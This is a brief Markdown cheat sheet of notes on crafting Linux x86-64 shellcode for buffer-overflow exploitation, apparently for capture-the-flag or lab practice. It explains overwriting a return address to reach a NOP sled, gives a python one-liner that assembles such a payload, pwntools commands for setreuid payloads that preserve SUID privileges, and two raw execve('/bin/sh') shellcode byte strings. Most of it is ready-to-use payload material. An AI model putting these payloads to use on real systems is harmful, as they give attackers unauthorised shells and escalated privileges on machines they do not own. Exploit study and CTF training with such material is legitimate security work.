# Analysing windows shellcode
https://github.com/mandiant/speakeasy

# Craft shell code
## General ideas
Write the shell code and find a way to update a function return call to point to the beginning of the shell code.

Because each system behave differently, it's safe to add some NOP instructions (\x90).

e.g.
```bash
python -c "print (b'\x90' * no_of_nops + shellcode + random_data * no_of_random_data + memory address)"
```

## Payloads
### Keep some suid
https://docs.pwntools.com/en/stable/shellcraft.html
Must be used in command line to specify the format:
e.g.
```bash
~/.local/bin/pwn shellcraft -f d amd64.linux.setreuid 1002
```

asm(pwnlib.shellcraft.amd64.linux.setreuid(1003), arch = 'amd64', os = 'linux')

### Basic shell (unix) - 30 chars
\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05

### Another basic shell (unix) - 40 chars
\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05

### With pwntools
```python
asm(shellcraft.amd64.linux.sh())
```
